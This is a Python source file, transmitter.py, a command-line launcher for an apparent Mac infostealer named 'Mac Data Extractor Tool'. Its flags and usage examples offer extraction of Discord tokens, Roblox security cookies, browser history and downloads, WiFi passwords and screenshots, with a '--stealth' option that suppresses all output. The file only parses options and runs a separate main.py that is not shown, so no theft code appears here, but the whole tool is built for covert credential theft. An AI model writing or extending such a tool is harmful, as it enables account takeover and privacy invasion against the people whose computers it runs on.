import argparse
import subprocess
import sys
import os
from pathlib import Path

def run_extractor(args_list):
    main_py = Path(__file__).parent / 'main.py'
    if not main_py.exists():
        print('main.py not found in the same directory as transmitter.py')
        sys.exit(1)
    cmd = [sys.executable, str(main_py)] + args_list
    try:
        result = subprocess.run(cmd, capture_output=False)
        if result.returncode != 0:
            print(f'Extractor exited with code {result.returncode}')
    except Exception as e:
        print(f'Error running extractor: {e}')


def main():
    parser = argparse.ArgumentParser(
        description="Transmitter for Mac Data Extractor Tool (main.py)",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  python transmitter.py -t -r -w         # Extract Discord tokens, Roblox cookies, and WiFi passwords
  python transmitter.py -b -d --save    # Extract browser history and downloads, save to file
  python transmitter.py --show          # Show last saved results
  python transmitter.py -r --stealth    # Extract Roblox cookies silently
  python transmitter.py -t -r -w -s     # Extract tokens, Roblox, WiFi, and take screenshot
        """
    )
    parser.add_argument("-t", "--tokens", action="store_true", help="Extract Discord tokens")
    parser.add_argument("-r", "--roblox", action="store_true", help="Extract Roblox security cookies (local and via requests)")
    parser.add_argument("-b", "--browser", action="store_true", help="Extract browser history")
    parser.add_argument("-d", "--downloads", action="store_true", help="Extract browser downloads")
    parser.add_argument("-w", "--wifi", action="store_true", help="Extract WiFi SSIDs and passwords")
    parser.add_argument("-s", "--screenshot", action="store_true", help="Take a screenshot")
    parser.add_argument("--save", action="store_true", help="Save results to file instead of printing")
    parser.add_argument("--show", action="store_true", help="Show last saved results")
    parser.add_argument("--stealth", action="store_true", help="Suppress all output")
    args = parser.parse_args()

    # Build argument list for main.py
    arglist = []
    if args.tokens:
        arglist.append('-t')
    if args.roblox:
        arglist.append('-r')
    if args.browser:
        arglist.append('-b')
    if args.downloads:
        arglist.append('-d')
    if args.wifi:
        arglist.append('-w')
    if args.screenshot:
        arglist.append('-s')
    if args.save:
        arglist.append('--save')
    if args.show:
        arglist.append('--show')
    if args.stealth:
        arglist.append('--stealth')

    if not (args.tokens or args.roblox or args.browser or args.downloads or args.wifi or args.screenshot or args.show):
        parser.error("No extraction selected. Use -t, -r, -b, -d, -w, -s or --show.")

    run_extractor(arglist)

if __name__ == "__main__":
    main() 